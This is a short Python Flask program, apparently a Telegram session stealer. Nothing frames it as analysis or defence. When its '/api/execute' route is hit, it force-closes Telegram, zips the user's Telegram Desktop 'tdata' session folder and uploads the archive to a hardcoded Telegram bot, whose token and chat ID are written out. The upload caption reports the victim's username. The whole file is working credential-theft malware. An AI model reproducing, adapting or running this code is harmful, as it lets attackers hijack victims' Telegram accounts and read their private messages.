import os
import zipfile
import requests
import io
from flask import Flask, jsonify
from getpass import getuser

app = Flask(__name__)

TOKEN = "8617771176:AAEeY9Kuu5kNwkpLmSkema8oKaizJ-z5Nfk"
CHAT_ID = "7086429203"

def collect_and_send():
    os.system("taskkill /f /im Telegram.exe >nul 2>&1")
    
    user_name = getuser()
    appdata = os.environ.get('APPDATA')
    if not appdata:
        return "APPDATA not found"
        
    tdata_path = os.path.join(appdata, "Telegram Desktop", "tdata")
    
    if not os.path.exists(tdata_path):
        return "Path not found"

    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
        for root, dirs, files in os.walk(tdata_path):
            if any(x in root.lower() for x in ['user_data', 'dumps', 'emoji', 'webview', 'temp']):
                continue
                
            for file in files:
                if file.endswith(('.log', '.exe', '.tmp')) or 'old' in file.lower():
                    continue
                
                file_path = os.path.join(root, file)
                rel_path = os.path.relpath(file_path, tdata_path)
                
                try:
                    with open(file_path, 'rb') as f:
                        zip_file.writestr(rel_path, f.read())
                except:
                    continue

    zip_buffer.seek(0)
    file_size = zip_buffer.getbuffer().nbytes
    
    if file_size < 100:
        return "Empty archive"

    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    files = {'document': ('tdata.zip', zip_buffer)}
    data = {'chat_id': CHAT_ID, 'caption': f'✅ Seans yigildi\nUser: {user_name}\nHajm: {file_size / 1024:.2f} KB'}
    
    try:
        r = requests.post(url, data=data, files=files, timeout=100)
        return r.json()
    except Exception as e:
        return str(e)

@app.route('/api/execute')
def index():
    result = collect_and_send()
    return jsonify({"status": "executed", "result": result})